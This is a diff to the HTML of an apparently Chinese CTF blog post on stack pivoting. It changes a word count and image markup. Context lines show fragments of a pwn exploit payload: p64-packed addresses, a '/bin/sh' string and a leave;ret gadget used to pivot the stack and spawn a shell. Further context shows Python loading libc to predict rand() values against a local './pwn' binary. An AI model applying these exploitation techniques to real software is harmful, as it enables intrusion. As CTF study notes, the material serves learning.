@@ -372,7 +372,7 @@
             </span>
             <div class="blank_box"></div>
             <span class="meta">
-              Words <span class="post-count">175</span> In Total
+              Words <span class="post-count">185</span> In Total
             </span>
             <div class="blank_box"></div>
             <!-- WordCount end -->
@@ -438,15 +438,30 @@ p64(gift_addr+<span class="hljs-number">24</span>) +`
 `<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) +  	 /<span class="hljs-built_in">bin</span>/sh      
 p64(gift_addr-<span class="hljs-number">8</span>) + 						(栈迁移的地址-<span class="hljs-number">8</span>)			  rbp` 
 `p64(leave_ret_addr))		 			rbp+<span class="hljs-number">8</span> -&gt; leave_ret      retn_addr`</code></pre>
-<p><img src="/cn/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20221116151457429.png"></p>
-<p><img src="/cn/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20221116153944826-1679021708178-32.png"></p>
+<figure>
+<img src="/cn/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20221116151457429.png" alt="image-20221116151457429">
+<figcaption aria-hidden="true">image-20221116151457429</figcaption>
+</figure>
+<figure>
+<img src="/cn/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20221116153944826-1679021708178-32.png" alt="image-20221116153944826">
+<figcaption aria-hidden="true">image-20221116153944826</figcaption>
+</figure>
 <figure>
 <img src="/cn/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20221116154046369-1679021715094-35.png" alt="image-20221116154046369">
 <figcaption aria-hidden="true">image-20221116154046369</figcaption>
 </figure>
-<p><img src="/cn/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20221116154352506-1679021721296-38.png"></p>
-<p><img src="/cn/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20221116154408387-1679021727207-41.png"></p>
-<p><img src="/cn/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20221116154421475-1679021734606-44.png"></p>
+<figure>
+<img src="/cn/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20221116154352506-1679021721296-38.png" alt="image-20221116154352506">
+<figcaption aria-hidden="true">image-20221116154352506</figcaption>
+</figure>
+<figure>
+<img src="/cn/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20221116154408387-1679021727207-41.png" alt="image-20221116154408387">
+<figcaption aria-hidden="true">image-20221116154408387</figcaption>
+</figure>
+<figure>
+<img src="/cn/%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AD%A6%E4%B9%A0/image-20221116154421475-1679021734606-44.png" alt="image-20221116154421475">
+<figcaption aria-hidden="true">image-20221116154421475</figcaption>
+</figure>
 <h2 id="三.学到了srand与rand">三.学到了srand()与rand()</h2>
 <pre><code class="hljs python">`elf = cdll.LoadLibrary(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)`
 `r = process(<span class="hljs-string">&quot;./pwn&quot;</span>)`
